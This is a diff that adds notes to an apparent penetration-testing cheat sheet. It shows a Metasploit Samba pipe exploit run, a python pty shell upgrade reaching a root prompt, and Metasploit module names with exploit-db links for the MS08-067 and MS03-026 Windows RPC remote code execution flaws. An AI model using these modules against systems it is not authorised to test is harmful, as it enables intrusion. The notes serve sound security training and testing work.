@@ -77,3 +77,26 @@ msf exploit(is_known_pipename) > exploit
 
 python -c 'import pty;pty.spawn("/bin/bash")'
 root@1d71e2ebf7b6:/tmp# exit
+
+
+*Microsoft RPC - MS08-067. Code execution *
+----
+
+Metsploit:
+https://www.exploit-db.com/exploits/16362/
+use exploit/windows/smb/ms08_067_netapi
+options
+info
+
+Standalone exploit:
+https://www.exploit-db.com/exploits/7104/
+
+
+*CVE-2003-0352 / MS03-026 Microsoft RPC DCOM Interface Overflow*
+-----
+use exploit/windows/dcerpc/ms03_026_dcom
+https://www.exploit-db.com/exploits/16749/
+https://www.securityfocus.com/bid/8205/exploit
+
+https://blog.rapid7.com/2012/05/22/10-hottest-metasploit-exploit-and-auxiliary-modules-in-april/
+
